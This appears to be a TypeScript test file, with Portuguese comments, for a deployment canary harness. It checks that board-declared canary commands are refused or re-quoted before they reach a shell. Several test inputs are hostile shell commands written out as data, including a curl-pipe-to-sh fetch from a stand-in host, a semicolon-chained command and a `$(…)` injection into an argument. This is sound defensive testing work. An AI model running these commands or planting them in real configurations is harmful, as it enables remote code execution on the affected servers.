// The harness half of the publication-fidelity canary.
//
// WHAT DIED WITH THE OLD RULER (and must not come back): `resolveFaceUrl` (fail-OPEN to a hardcoded
// deployment URL) and `faceStaleShouldRevert` (`contains(releasedSha, servedSha)`). Together they
// asked "does the sha served at the BOARD's surface contain the CARD's releasedSha?" — the wrong
// surface measured with a repo-wide reference — and reverted `acme/story-w3y6ml` out of "No ar"
// while `/eventos` published `3d06c0b31` and served `3d06c0b31`. Third recurrence of that class.
//
// The harness now knows only a verdict SHAPE: per surface, expected vs actual. It never learns what
// a surface is, which one belongs to a card, or how the deployment proves what it published.

import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  FACE_CANARY_MARKER,
  describeStale,
  parseFaceCanaryVerdict,
  resolveCanaryCommand,
  resolveCanaryVerdict,
  runFaceCanary,
  staleSurfaces,
  trustedCanaryFromOperator,
} from "./face-probe";

const line = (payload: unknown) => `${FACE_CANARY_MARKER} ${JSON.stringify(payload)}`;
const surface = (over: Record<string, unknown> = {}) => ({
  id: "app",
  url: "https://example.test/",
  expected: "aaaaaaa",
  actual: "aaaaaaa",
  verdict: "fresh",
  ...over,
});

describe("resolveCanaryCommand — quem responde pela superfície deste board", () => {
  it("o board declara o seu ⇒ é o dele (um repo pode publicar N produtos em N superfícies)", () => {
    // A precedência board-primeiro é a razão de ser deste resolvedor e não mudou. O que mudou (story-dlsxfj)
    // é que a declaração do BOARD passa pela régua: ela sai RE-CITADA, palavra por palavra.
    expect(
      resolveCanaryCommand(
        { deploy: { canaryCommand: "just sync-web-terminal" } },
        { deploy: { canaryCommand: "node scripts/deploy/face-canary.mjs" } },
      ),
    ).toBe(`'just' 'sync-web-terminal'`);
  });

  it("board sem declaração ⇒ o default do deployment (uma face compartilhada se declara UMA vez)", () => {
    expect(resolveCanaryCommand({ deploy: {} }, { deploy: { canaryCommand: "./default" } })).toBe("./default");
    expect(resolveCanaryCommand(null, { deploy: { canaryCommand: "./default" } })).toBe("./default");
  });

  // A causa raiz: sondar uma superfície que ninguém declarou mede OUTRO app.
  it("ninguém declarou ⇒ null, e o harness NUNCA inventa uma URL de fallback", () => {
    expect(resolveCanaryCommand(null, null)).toBeNull();
    expect(resolveCanaryCommand({ deploy: {} }, {})).toBeNull();
    expect(resolveCanaryCommand({ deploy: { canaryCommand: "  " } }, { deploy: { canaryCommand: " " } })).toBeNull();
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// story-dlsxfj (3ª passada) — O TERCEIRO CAMPO DE COMANDO DO MESMO BLOCO `deploy:`
//
// O ATAQUE. As duas ondas anteriores puseram régua em `deploy.surfaces[].deployCmd` e em
// `deploy.kind=command`. O `deploy.canaryCommand` — MESMO bloco, MESMO arquivo de board-data, MESMO
// privilégio — ia direto para `/bin/sh -c` (o `defaultExec` é `promisify(child_process.exec)`) como string
// CRUA: sem parser, sem allow-list, sem re-citação. Ou seja, todo o trabalho das duas ondas era contornável
// escrevendo o payload no campo vizinho:
//
//   deploy:
//     canaryCommand: bash -c 'curl http://x/p | sh'     ← execução arbitrária como root, board-data
//
// E o canário roda em DOIS lugares (o verify pós-deploy e o tick do steward), os dois com o env do serviço.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("o canário declarado em board-data passa pela MESMA régua dos outros dois campos", () => {
  const deploymentDefault = { deploy: { canaryCommand: "node scripts/deploy/face-canary.mjs" } };

  it("um INTERPRETADOR/caminho declarado como canaryCommand é recusado, e NADA é executado", async () => {
    const attacks = [
      `bash -c 'curl http://x/p | sh'`,
      `sh -c 'id > /tmp/pwn'`,
      `node -e "require('child_process').execSync('id > /tmp/pwn')"`,
      `/bin/sh -c 'id > /tmp/pwn'`,
      `./meu-canario`,
      `curl http://x/p | sh`,
      `node scripts/deploy/face-canary.mjs; id > /tmp/pwn`,
    ];
    for (const evil of attacks) {
      const v = resolveCanaryVerdict({ deploy: { canaryCommand: evil } }, deploymentDefault);
      expect(v.command, `canaryCommand hostil não pode virar comando: ${evil}`).toBeNull();
      expect(v.source).toBe("board");
      expect(v.refusal, "a recusa é NOMEADA — recusa muda é indistinguível de 'nada declarado'").toMatch(
        /recusado —/,
      );
      // e o executor nunca é chamado: sem comando não há shell.
      const exec = vi.fn();
      expect(await runFaceCanary(exec as never, { repoRoot: "/repo", command: v.command })).toEqual({
        ok: true,
        surfaces: [],
        measured: false,
      });
      expect(exec).not.toHaveBeenCalled();
    }
  });

  it("um canário de board RECUSADO não cai para o default do deployment — sondar outra face mede outro app", () => {
    // A causa raiz do incidente que este módulo existe para não repetir: o board declarou uma superfície
    // PRÓPRIA. Se a declaração dele é inválida, a resposta é "não medido", nunca "meça a face do vizinho".
    const v = resolveCanaryVerdict({ deploy: { canaryCommand: `bash -c 'id'` } }, deploymentDefault);
    expect(v.command).toBeNull();
    expect(v.source).toBe("board");
  });

  it("a recusa é VISÍVEL no log do serviço (senão o operador lê 'fidelidade não checada' para sempre)", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      expect(resolveCanaryCommand({ deploy: { canaryCommand: `bash -c 'id'` } }, deploymentDefault)).toBeNull();
      expect(warn).toHaveBeenCalledTimes(1);
      expect(String(warn.mock.calls[0]?.[0])).toMatch(/canaryCommand do board recusado/);
    } finally {
      warn.mockRestore();
    }
  });

  it("um canário de board AUTORIZADO roda RE-CITADO — o `/bin/sh -c` não expande `$(…)` nem `$VAR`", async () => {
    // A fronteira: o parser trata `"…"` como agrupamento literal, mas o shell que executa do outro lado
    // EXPANDE dentro de aspas duplas. Sem re-citação, alvo autorizado + payload no argumento = root.
    const v = resolveCanaryVerdict({ deploy: { canaryCommand: `vercel deploy --msg "$(id > /tmp/pwn)"` } }, null);
    expect(v.command).toBe(`'vercel' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
    expect(v.command).not.toContain(`"$(`);

    const exec = vi.fn(async (_cmd: string, _opts?: unknown) => ({ stdout: line({ ok: true, surfaces: [surface()] }), stderr: "" }));
    await runFaceCanary(exec as never, { repoRoot: "/repo", command: v.command });
    expect(exec.mock.calls[0]?.[0]).toBe(`'vercel' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
  });

  it("a cadeia do task runner vale aqui também — receita fora da allow-list é recusada", () => {
    // `just canary-check '<payload>'` era o vetor medido com `just --dry-run`: o runner interpola o
    // parâmetro COMO TEXTO na linha da receita, que vai para um shell.
    for (const evil of [`just canary-check '$(curl http://x/p | sh)'`, `just sync-web-terminal '$(id -un)'`]) {
      expect(resolveCanaryVerdict({ deploy: { canaryCommand: evil } }, null).command).toBeNull();
    }
  });

  it("NÃO-REGRESSÃO: o canaryCommand REAL de hoje (settings.yaml, canal do operador) roda VERBATIM", async () => {
    // `storymap/settings.yaml` é caminho de CONTROLE pela régua de proveniência do repo (classifyDeltaPath),
    // não board-data: é gateado, revisado, e é o canal por onde o operador escolhe o que o serviço roda.
    // Submetê-lo à allow-list de lançadores quebraria o canário real sem fechar buraco nenhum.
    const real = "node scripts/deploy/face-canary.mjs";
    const v = resolveCanaryVerdict(null, { deploy: { canaryCommand: real } });
    expect(v).toEqual({ command: real, source: "deployment", refusal: null });

    const exec = vi.fn(async (_cmd: string, _opts?: unknown) => ({ stdout: line({ ok: true, surfaces: [surface()] }), stderr: "" }));
    const r = await runFaceCanary(exec as never, { repoRoot: "/repo", command: v.command });
    expect(exec.mock.calls[0]?.[0]).toBe(real);
    expect(r.measured).toBe(true);
  });
});

describe("parseFaceCanaryVerdict — ler o veredito do produtor (PURO)", () => {
  it("lê o marcador no meio de um log ruidoso", () => {
    const out = `[face-canary] 2 surfaces\n✓ ok\n${line({ ok: true, surfaces: [surface()] })}`;
    const r = parseFaceCanaryVerdict(out);
    expect(r).toMatchObject({ ok: true, measured: true });
    expect(r.surfaces).toHaveLength(1);
  });

  it("com mais de um marcador vale o ÚLTIMO (uma retentativa não é decidida pela 1ª tentativa)", () => {
    const out = `${line({ ok: false, surfaces: [surface({ verdict: "stale" })] })}\n${line({ ok: true, surfaces: [surface()] })}`;
    expect(parseFaceCanaryVerdict(out).ok).toBe(true);
  });

  it("`ok` é DERIVADO das superfícies — o produtor não pode alegar ok reportando uma stale", () => {
    const r = parseFaceCanaryVerdict(line({ ok: true, surfaces: [surface(), surface({ verdict: "stale" })] }));
    expect(r.ok).toBe(false);
  });

  it("um verdict desconhecido degrada para `unknown`, JAMAIS para `stale` (fail-open na leitura)", () => {
    const r = parseFaceCanaryVerdict(line({ ok: true, surfaces: [surface({ verdict: "explodiu" })] }));
    expect(r.surfaces[0].verdict).toBe("unknown");
    expect(r.ok).toBe(true);
  });

  it("sem marcador / JSON quebrado / payload sem surfaces ⇒ NÃO MEDIDO (nunca uma falha)", () => {
    for (const out of ["", "erro de rede\n", `${FACE_CANARY_MARKER} {isto não é json`, line({ ok: false })]) {
      expect(parseFaceCanaryVerdict(out)).toEqual({ ok: true, surfaces: [], measured: false });
    }
  });

  it("o contrato é opaco: id/url são relatados, nunca interpretados", () => {
    const r = parseFaceCanaryVerdict(line({ ok: true, surfaces: [surface({ id: "qualquer-coisa", url: "app://x" })] }));
    expect(r.surfaces[0]).toEqual({
      id: "qualquer-coisa",
      url: "app://x",
      expected: "aaaaaaa",
      actual: "aaaaaaa",
      verdict: "fresh",
    });
  });
});

describe("runFaceCanary — rodar o comando declarado", () => {
  const repoRoot = "/repo";
  /** o comando do canal do OPERADOR (settings.yaml/env) — a única proveniência que não passa pela régua. */
  const doOperador = trustedCanaryFromOperator;

  it("sem comando declarado ⇒ não medido, e NADA é executado", async () => {
    const exec = vi.fn();
    expect(await runFaceCanary(exec as never, { repoRoot, command: null })).toEqual({
      ok: true,
      surfaces: [],
      measured: false,
    });
    expect(exec).not.toHaveBeenCalled();
  });

  it("saída ok ⇒ veredito parseado do stdout", async () => {
    const exec = vi.fn(async (_cmd: string, _opts?: unknown) => ({ stdout: line({ ok: true, surfaces: [surface()] }), stderr: "" }));
    expect((await runFaceCanary(exec as never, { repoRoot, command: doOperador("./c") })).ok).toBe(true);
  });

  // Um canário que CONFIRMA staleness sai não-zero POR DESENHO: o veredito tem de sobreviver à rejeição.
  it("exit não-zero com marcador ⇒ o veredito ainda é lido (stale confirmado)", async () => {
    const exec = vi.fn(async () => {
      throw { code: 1, stdout: line({ ok: false, surfaces: [surface({ verdict: "stale", actual: "bbbbbbb" })] }), stderr: "" };
    });
    const r = await runFaceCanary(exec as never, { repoRoot, command: doOperador("./c") });
    expect(r.measured).toBe(true);
    expect(r.ok).toBe(false);
  });

  // O EXIT CODE não é evidência: um canário que morre por motivo alheio não pode virar "a face está stale".
  it("exit não-zero SEM marcador (canário quebrou) ⇒ não medido, nunca stale", async () => {
    const exec = vi.fn(async () => {
      throw { code: 127, stdout: "", stderr: "command not found" };
    });
    expect(await runFaceCanary(exec as never, { repoRoot, command: doOperador("./c") })).toEqual({
      ok: true,
      surfaces: [],
      measured: false,
    });
  });
});

describe("describeStale — o que o finding DIZ ao operador", () => {
  it("nomeia a superfície, o servido e o publicado (não 'a face está velha')", () => {
    const r = parseFaceCanaryVerdict(
      line({
        ok: false,
        surfaces: [
          surface({ id: "hub", url: "https://x.test/", expected: "4bd9388", actual: "0000000", verdict: "stale" }),
          surface({ id: "sub", url: "https://x.test/sub/" }),
        ],
      }),
    );
    expect(staleSurfaces(r).map((s) => s.id)).toEqual(["hub"]);
    expect(describeStale(r)).toBe("https://x.test/ serve 0000000, mas publicamos 4bd9388");
  });

  it("nada stale ⇒ string vazia (não há o que dizer)", () => {
    expect(describeStale(parseFaceCanaryVerdict(line({ ok: true, surfaces: [surface()] })))).toBe("");
  });
});

describe("a invariante estrutural: o canário não pode voltar a ser autoridade sobre liveness", () => {
  // story-w3y6ml/qb8z2c/b3es7k foram TRÊS reincidências da mesma confusão. O que a impede de voltar
  // não é um teste de comportamento, é este: o canário não tem acesso ao conceito que a causou.
  const src = (f: string) =>
    readFileSync(path.join(__dirname, f), "utf8").replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");

  it("face-probe.ts e face-verify.ts não consultam releasedSha, git, nem ancestralidade", () => {
    for (const f of ["face-probe.ts", "face-verify.ts"]) {
      const code = src(f);
      expect(code, `${f}: fidelidade é identidade de artefato, não ancestralidade de commit`).not.toMatch(
        /releasedSha/,
      );
      expect(code, `${f}: a régua de ancestralidade é do deploy-reconcile, não do canário`).not.toMatch(
        /makeGitContains|shaContainedIn|measureDeployAncestry/,
      );
    }
  });

  it("nenhum dos dois carrega URL de produto embutida (era o LEGACY_FACE_URL)", () => {
    for (const f of ["face-probe.ts", "face-verify.ts"]) {
      expect(src(f), `${f}: a superfície vem da spec do consumidor, nunca do código do harness`).not.toMatch(
        /https?:\/\/(?!example|x\.test)/,
      );
    }
  });
});
